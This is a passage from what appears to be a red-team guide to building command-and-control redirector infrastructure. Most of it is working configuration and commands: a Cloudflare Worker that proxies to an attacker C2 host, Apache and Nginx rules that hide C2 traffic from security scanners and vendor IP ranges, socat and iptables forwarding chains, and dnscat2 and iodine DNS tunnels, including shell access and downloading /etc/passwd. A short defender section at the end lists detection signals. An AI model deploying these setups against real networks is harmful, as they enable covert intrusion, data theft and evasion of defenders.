  2. Fronted C2: use CDN Worker/Function as proxy
  3. Cloud Function C2: route through Lambda/Cloud Functions
```

### 1.4 C2 Proxy Concept Using Cloudflare Workers

```javascript
// Cloudflare Worker example (concept)
// Forward to actual C2 through cloudflare.com domain

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Actual C2 server address
  const C2_BACKEND = 'https://real-c2.attacker.com'
  
  // Clone and forward request
  const newRequest = new Request(C2_BACKEND + new URL(request.url).pathname, {
    method: request.method,
    headers: request.headers,
    body: request.body,
  })
  
  return fetch(newRequest)
}
```

---

## 2. HTTP Redirector Setup

### 2.1 Apache mod_rewrite Redirector

```bash
# Install Apache and enable modules
apt-get install apache2 -y
a2enmod rewrite proxy proxy_http ssl

# Virtual host configuration: /etc/apache2/sites-available/redirector.conf
```

```apache
<VirtualHost *:80>
    ServerName redirector.example.com
    
    # Enable all mod_rewrite rules
    RewriteEngine On
    
    # Block blue team/scanners (known security vendor IP ranges)
    RewriteCond %{REMOTE_ADDR} ^66\.249\. [OR]    # Google
    RewriteCond %{REMOTE_ADDR} ^157\.55\. [OR]    # Microsoft/Bing
    RewriteCond %{REMOTE_ADDR} ^54\.239\.          # AWS Scanner
    RewriteRule .* https://www.microsoft.com/ [L,R=302]
    
    # User-Agent filtering (block scanners)
    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scanner|masscan|nmap) [NC]
    RewriteRule .* https://www.google.com/ [L,R=302]
    
    # Forward only specific URI patterns to C2 (matching Malleable C2 profile)
    RewriteCond %{REQUEST_URI} ^/updates/check [OR]
    RewriteCond %{REQUEST_URI} ^/api/v2/ [OR]
    RewriteCond %{REQUEST_URI} ^/static/js/
    RewriteRule ^(.*)$ http://10.0.0.5:8080$1 [P,L]
    
    # All other requests → legitimate site
    RewriteRule .* https://www.example.com/ [L,R=302]
    
    # Proxy settings
    ProxyPassReverse / http://10.0.0.5:8080/
</VirtualHost>
```

```bash
# Apply configuration
apache2ctl configtest
systemctl reload apache2

# Check logs
tail -f /var/log/apache2/access.log | grep -v "302"
```

### 2.2 Nginx Redirector

```nginx
# /etc/nginx/sites-available/redirector.conf

# IP blacklist map
geo $blocked_ip {
    default 0;
    66.249.0.0/16   1;   # Google
    157.55.0.0/16   1;   # Bing
    104.154.0.0/15  1;   # GCP Scanner
}

# User-Agent blacklist map
map $http_user_agent $blocked_agent {
    default 0;
    ~*(curl|wget|python-requests|masscan|nmap|nuclei) 1;
}

server {
    listen 80;
    server_name redirector.example.com;
    
    # Handle blocked IPs/agents
    if ($blocked_ip) {
        return 302 https://www.microsoft.com/;
    }
    if ($blocked_agent) {
        return 302 https://www.google.com/;
    }
    
    # Route C2 traffic (specific URI patterns)
    location ~* ^/(updates|api/v2|static/js)/ {
        proxy_pass http://10.0.0.5:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # Timeout settings
        proxy_connect_timeout 10s;
        proxy_read_timeout 60s;
        
        # Error handling
        proxy_intercept_errors on;
        error_page 502 503 504 = @fallback;
    }
    
    # Fallback: legitimate site
    location @fallback {
        return 302 https://www.example.com/;
    }
    
    # Default: redirect to legitimate site
    location / {
        return 302 https://www.example.com/;
    }
}
```

---

## 3. HTTPS Redirector + Let's Encrypt Certificate

### 3.1 Issue Certificate with Certbot

```bash
# Install Certbot
apt-get install certbot python3-certbot-nginx -y

# Issue certificate (HTTP-01 challenge)
certbot --nginx -d redirector.example.com --non-interactive --agree-tos -m admin@example.com

# Wildcard certificate (DNS-01 challenge)
certbot certonly \
  --manual \
  --preferred-challenges dns \
  -d "*.example.com" \
  --agree-tos \
  -m admin@example.com

# Auto renewal
systemctl enable certbot.timer
certbot renew --dry-run

# Certificate paths
# /etc/letsencrypt/live/redirector.example.com/fullchain.pem
# /etc/letsencrypt/live/redirector.example.com/privkey.pem
```

### 3.2 HTTPS Nginx Configuration

```nginx
server {
    listen 443 ssl http2;
    server_name redirector.example.com;
    
    ssl_certificate /etc/letsencrypt/live/redirector.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirector.example.com/privkey.pem;
    
    # TLS hardening
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000" always;
    
    # Redirector logic (same as HTTP configuration)
    location ~* ^/(updates|api/v2)/ {
        proxy_pass https://10.0.0.5:443;
        proxy_ssl_verify off;  # Allow internal C2 self-signed certificate
        proxy_set_header Host $host;
    }
    
    location / {
        return 302 https://www.example.com/;
    }
}

# HTTP → HTTPS redirect
server {
    listen 80;
    server_name redirector.example.com;
    return 301 https://$host$request_uri;
}
```

---

## 4. Socat/iptables Port Forwarding Chain

### 4.1 Socat Port Forwarding

```bash
# Install
apt-get install socat -y

# TCP port forwarding (simple)
socat TCP-LISTEN:443,fork TCP:10.0.0.5:443

# Run in background
nohup socat TCP-LISTEN:443,fork TCP:10.0.0.5:443 &

# Register as systemd service
cat > /etc/systemd/system/socat-redirector.service <<'EOF'
[Unit]
Description=Socat Port Redirector
After=network.target

[Service]
ExecStart=/usr/bin/socat TCP-LISTEN:443,fork,reuseaddr TCP:10.0.0.5:443
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl enable socat-redirector
systemctl start socat-redirector

# Multi-port forwarding
socat TCP-LISTEN:80,fork TCP:10.0.0.5:80 &
socat TCP-LISTEN:443,fork TCP:10.0.0.5:443 &
socat TCP-LISTEN:8080,fork TCP:10.0.0.5:8080 &

# UDP forwarding (DNS C2)
socat UDP-LISTEN:53,fork UDP:10.0.0.5:53 &
```

### 4.2 iptables NAT Forwarding

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf

# PREROUTING: rewrite incoming traffic
iptables -t nat -A PREROUTING \
  -p tcp \
  --dport 443 \
  -j DNAT \
  --to-destination 10.0.0.5:443

# POSTROUTING: change source IP (masquerading)
iptables -t nat -A POSTROUTING \
  -p tcp \
  -d 10.0.0.5 \
  --dport 443 \
  -j MASQUERADE

# DNS UDP forwarding
iptables -t nat -A PREROUTING \
  -p udp \
  --dport 53 \
  -j DNAT \
  --to-destination 10.0.0.5:53

iptables -t nat -A POSTROUTING \
  -p udp \
  -d 10.0.0.5 \
  --dport 53 \
  -j MASQUERADE

# Save rules
iptables-save > /etc/iptables/rules.v4

# Check rules
iptables -t nat -L -v -n

# Remove rules (cleanup)
iptables -t nat -F
```

### 4.3 Multi-Hop Forwarding Chain

```
Structure:
  [Agent] → [Redirector1 (public VPS)] → [Redirector2 (private)] → [C2 Team Server]
  
  Redirector1 (IP: 1.2.3.4):
    iptables -t nat -A PREROUTING -p tcp --dport 443 \
      -j DNAT --to-destination 5.6.7.8:443
  
  Redirector2 (IP: 5.6.7.8):
    socat TCP-LISTEN:443,fork TCP:192.168.1.10:443
  
  Result:
    Agent only knows 1.2.3.4
    C2 team server is hidden behind 5.6.7.8
    If 1.2.3.4 is blocked → just change 5.6.7.8
```

---

## 5. DNS C2 Channel

### 5.1 dnscat2 Concept and Usage

```
dnscat2 operation:
  Client → DNS query (A/TXT/CNAME) → Authoritative DNS server (attacker) → C2 processing
  
  Encoding methods:
  - A query: <data_hex>.<session>.<domain>.attacker.com
  - TXT query: can transmit more data
  - CNAME: chain queries
```

```bash
# Install dnscat2 server
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server
gem install bundler
bundle install

# Start server (authoritative DNS mode)
ruby dnscat2.rb --dns domain=c2.attacker.com --secret=MySecret123

# Start server (direct port binding)
ruby dnscat2.rb --dns port=5353 --secret=MySecret123

# Run client (Windows)
dnscat2-v0.07-client-win32.exe --secret=MySecret123 c2.attacker.com

# Run client (Linux)
./dnscat --secret=MySecret123 c2.attacker.com

# dnscat2 server commands
dnscat2> sessions              # List sessions
dnscat2> session -i 1          # Select session
command (session1)> shell      # Open shell
command (session1)> exec whoami
command (session1)> download /etc/passwd /tmp/passwd
command (session1)> tunnelserver 127.0.0.1:4444  # Tunneling
```

### 5.2 DNS Record Setup (Authoritative DNS)

```
# Add to DNS zone file (BIND example)
# /etc/bind/zones/attacker.com

$TTL 300
@   IN  SOA ns1.attacker.com. admin.attacker.com. (
            2024010101 ; Serial
            3600       ; Refresh
            900        ; Retry
            604800     ; Expire
            300 )      ; Minimum TTL

; NS record - designate self as nameserver for c2 subdomain
c2  IN  NS  ns1.attacker.com.

; Nameserver A record
ns1 IN  A   1.2.3.4  ; Attacker server IP
```

### 5.3 iodine DNS Tunneling

```bash
# iodine: IP-over-DNS tunnel
# Install
apt-get install iodine

# Server side (with authoritative DNS)
iodined -f -c -P password 10.0.0.1 dns.attacker.com

# Client side
iodine -f -P password dns.attacker.com
# → Creates dns0 interface, assigns 10.0.0.2 IP

# SSH through tunnel
ssh -D 1080 10.0.0.1  # SOCKS proxy
```

---

## 6. Python Traffic Redirector Script

```python
#!/usr/bin/env python3
"""
Educational Python HTTP/HTTPS traffic redirector
- IP/User-Agent filtering
- URI pattern-based routing
- C2 proxy or decoy response
CTF/research environments only
"""
# (See Korean section for full source code — identical implementation)
```

---

## 7. Redirector Configuration File Example

```json
{
    "c2_host": "10.0.0.5",
    "c2_port": 8080,
    "decoy_url": "https://www.microsoft.com/",
    "allowed_uris": [
        "^/api/v2/",
        "^/updates/check",
        "^/static/js/bundle",
        "^/cdn-cgi/"
    ],
    "blocked_agents": [
        "curl", "wget", "python-requests",
        "masscan", "nmap", "nuclei",
        "shodan", "censys", "zgrab"
    ],
    "blocked_ips": [
        "66.249.0.0/16",
        "157.55.0.0/16",
        "54.239.0.0/16",
        "104.154.0.0/15"
    ],
    "use_ssl": false,
    "cert_file": "",
    "key_file": ""
}
```

---

## 8. Production Redirector Chain Configuration

```
Architecture:

Internet
  │
  ▼
[Cloudflare CDN] ── domain masking, DDoS protection
  │
  ▼
[Redirector VPS 1] ── Apache + mod_rewrite
  │    Public IP: 1.2.3.4
  │    - Block scanner/blue team IPs
  │    - URI pattern filtering
  │
  ▼ (private channel, VPN or SSH tunnel)
[Redirector VPS 2] ── Nginx reverse proxy
  │    Internal IP: 10.10.0.2
  │    - Additional filtering layer
  │    - Minimize logging
  │
  ▼
[C2 Team Server] ── never directly exposed
     Internal IP: 192.168.1.10
     - Whitelist: only allow redirector IPs
     - Firewall blocks all other inbound

Redirector replacement strategy:
  - If VPS 1 is blocked → change DNS to new VPS 1'
  - Team server remains unchanged (prevent IP exposure)
  - If domain is blocked → use new domain
```

---

## References

- MITRE ATT&CK T1090: Proxy
- MITRE ATT&CK T1568: Dynamic Resolution
- "Red Team Development and Operations" - Joe Vest
- Apache mod_rewrite official documentation
- dnscat2 project: https://github.com/iagox86/dnscat2

---

## Attack Detection and Defense Validation

Red team infrastructure is about *operating without being caught*, but from the defender's side you must verify **whether the infra surfaces in network telemetry** and **whether detection actually catches it**. Red teamers can use this lens too, to gauge how effective their OPSEC really is.

### Attack -> mitigation layer -> control (defender) -> detection signal

| Technique | Targeted mitigation | Primary control (prevention) | Detection signal |
|---|---|---|---|
| Domain fronting (SNI != Host) | TLS inspection | Detect SNI/Host mismatch, CDN policy | TLS SNI vs HTTP Host header mismatch |
| HTTPS redirector | Domain reputation | Block new domains, reputation filter | Newly registered domain, short TTL |
| Category-bypass | Web proxy | Enforce categories, SSL intercept | Beacon to an uncategorized domain |

### Defense validation (verify yourself)

```bash
# 1) Reproduce detection of SNI/Host mismatch (a domain-fronting signal)
tshark -r capture.pcap -Y 'tls.handshake.extensions_server_name && http.host' \
  -T fields -e tls.handshake.extensions_server_name -e http.host
# Differing values suggest fronting -> confirm an inline proxy/NDR catches it
# 2) Check the redirector domain's registration date/TTL (new = risky)
whois example-redirector.tld | grep -i creation; dig +short example-redirector.tld
```

> Run validation only on **systems you own, in a controlled environment**. "Configured" is not the same as "blocked at runtime" -- reproduce the PoC and confirm the mitigation stops it (see [[68_Purple_Team]]).
